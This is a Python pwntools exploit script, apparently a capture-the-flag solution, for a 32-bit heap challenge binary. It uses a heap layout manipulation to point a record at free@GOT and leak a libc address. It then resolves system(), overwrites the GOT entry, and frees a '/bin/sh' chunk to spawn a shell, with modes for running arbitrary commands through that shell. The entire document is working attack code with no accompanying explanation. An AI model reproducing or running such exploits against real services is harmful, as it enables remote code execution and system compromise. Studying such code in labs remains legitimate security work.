#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./pwn", checksec=False)
context.arch = "i386"
context.log_level = "debug" if args.DEBUG else "info"


def start():
    if args.REMOTE:
        host = args.HOST or "127.0.0.1"
        port = int(args.PORT or 9999)
        return remote(host, port)

    env = {}
    # This challenge's classic unlink-style behavior is easier to reproduce
    # with tcache disabled on newer glibc.
    if not args.TCACHE:
        env["GLIBC_TUNABLES"] = "glibc.malloc.tcache_count=0"
    if args.LD_PRELOAD:
        env["LD_PRELOAD"] = args.LD_PRELOAD
    return process(elf.path, env=env)


def add(io, desc_size, name, text_len, text):
    io.sendlineafter(b"Action: ", b"0")
    io.sendlineafter(b"size of description: ", str(desc_size).encode())
    io.sendlineafter(b"name: ", name)
    io.sendlineafter(b"text length: ", str(text_len).encode())
    io.sendlineafter(b"text: ", text)


def delete(io, idx):
    io.sendlineafter(b"Action: ", b"1")
    io.sendlineafter(b"index: ", str(idx).encode())


def update(io, idx, text_len, text):
    io.sendlineafter(b"Action: ", b"3")
    io.sendlineafter(b"index: ", str(idx).encode())
    io.sendlineafter(b"text length: ", str(text_len).encode())
    io.sendlineafter(b"text: ", text)


def leak_free(io, idx):
    io.sendlineafter(b"Action: ", b"2")
    io.sendlineafter(b"index: ", str(idx).encode())
    io.recvuntil(b"description: ")
    leak = io.recvn(4)
    io.recvuntil(b"\n")
    return u32(leak)


def resolve_system(io, free_addr):
    if args.LIBC:
        libc = ELF(args.LIBC, checksec=False)
        return free_addr - libc.sym["free"] + libc.sym["system"], libc.path

    if args.REMOTE:
        try:
            from LibcSearcher import LibcSearcher
        except Exception:
            log.error("REMOTE mode needs `LIBC=...` or `LibcSearcher` installed.")
        libc = LibcSearcher("free", free_addr)
        system = free_addr - libc.dump("free") + libc.dump("system")
        return system, f"LibcSearcher({libc.libc})"

    libs = io.libs()
    libc_path = None
    for path in libs:
        if path.endswith("libc.so.6") or "/libc.so.6" in path:
            libc_path = path
            break
    if not libc_path:
        log.error("Cannot locate libc path from local process.")

    libc = ELF(libc_path, checksec=False)
    system = free_addr - libc.sym["free"] + libc.sym["system"]
    return system, libc_path


def exploit_once(offset):
    io = start()
    free_got = elf.got["free"]
    log.info("try offset = %#x", offset)

    add(io, 0x80, b"user0", 0x10, b"A" * 8)
    add(io, 0x80, b"user1", 0x10, b"B" * 8)
    add(io, 0x80, b"/bin/sh", 0x10, b"/bin/sh")

    delete(io, 0)

    payload = b"C" * offset + p32(free_got)
    add(io, 0x100, b"reclaim", len(payload), payload)

    free_addr = leak_free(io, 1)
    if free_addr == 0x43434343:
        io.close()
        raise ValueError("bad offset")

    log.success("free@libc = %#x", free_addr)
    system_addr, libc_from = resolve_system(io, free_addr)
    log.success("system = %#x (%s)", system_addr, libc_from)

    update(io, 1, 4, p32(system_addr))
    delete(io, 2)
    return io


def pwn():
    io = None
    err = None

    # Two common 32-bit glibc layouts:
    #  - 0x198: malloc alignment 8
    #  - 0x1b0: malloc alignment 16
    for off in (0x198, 0x1B0):
        try:
            io = exploit_once(off)
            break
        except Exception as e:
            err = e
            log.warning("offset %#x failed: %s", off, e)

    if io is None:
        raise err if err else RuntimeError("exploit failed")

    if args.CHECK:
        io.sendline(b"echo __PWNED__")
        io.recvuntil(b"__PWNED__")
        log.success("Exploit succeeded (shell command executed).")
        return

    if args.CMD:
        cmd = args.CMD.encode()
        io.sendline(cmd)
        io.sendline(b"echo __END__")
        out = io.recvuntil(b"__END__", timeout=3)
        print(out.decode("latin-1", errors="ignore"))
        return

    io.interactive()


if __name__ == "__main__":
    pwn()
